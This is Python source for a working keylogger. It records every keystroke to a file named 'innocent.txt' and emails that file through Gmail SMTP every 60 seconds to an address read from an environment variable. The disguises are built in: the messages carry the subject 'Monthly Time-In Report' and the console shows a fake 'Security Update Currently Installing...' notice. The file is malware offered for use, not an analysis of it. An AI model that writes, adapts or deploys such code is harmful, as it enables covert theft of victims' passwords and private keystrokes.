import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard
import threading
import time
import os

# Email credentials
EMAIL_ADDRESS = os.getenv('EMAIL_ADDRESS')
EMAIL_PASSWORD = os.getenv('EMAIL_PASSWORD')
TO_EMAIL = os.getenv('TO_EMAIL')

def send_email():
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = TO_EMAIL
        msg['Subject'] = 'Monthly Time-In Report'

        filename = "innocent.txt"
        
        # Open the file in binary mode
        with open(filename, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())

        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename= {filename}")

        msg.attach(part)

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        text = msg.as_string()
        server.sendmail(EMAIL_ADDRESS, TO_EMAIL, text)
        server.quit()
        print("Security Update Currently Installing...")

    except Exception as e:
        print("Security Update Currently Installing...")

def keyPressed(key):
    if key == keyboard.Key.esc:  # Use escape key to stop the listener
        return False
    with open("innocent.txt", "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            elif key == keyboard.Key.backspace:
                f.write('[BACKSPACE]')
            elif key == keyboard.Key.tab:
                f.write('[TAB]')
            elif key == keyboard.Key.shift:
                f.write('[SHIFT]')
            elif key == keyboard.Key.shift_r:
                f.write('[SHIFT_R]')
            elif key == keyboard.Key.ctrl:
                f.write('[CTRL]')
            elif key == keyboard.Key.ctrl_r:
                f.write('[CTRL_R]')
            elif key == keyboard.Key.alt:
                f.write('[ALT]')
            elif key == keyboard.Key.alt_gr:
                f.write('[ALT_GR]')
            elif key == keyboard.Key.esc:
                f.write('[ESC]')
            else:
                f.write(f'[{key.name}]')

def periodic_email(interval):
    while True:
        time.sleep(interval)
        send_email()

if __name__ == "__main__":
    try:
        # Start keylogger
        listener = keyboard.Listener(on_press=keyPressed)
        listener.start()

        # Set up a thread to send email every 60 seconds
        email_thread = threading.Thread(target=periodic_email, args=(60,))
        email_thread.start()

        # Keep the main thread running
        listener.join()  # Keep the listener thread running

    finally:
        # Ensure the file is deleted when the script is terminated
        if os.path.exists("innocent.txt"):
            os.remove("innocent.txt")
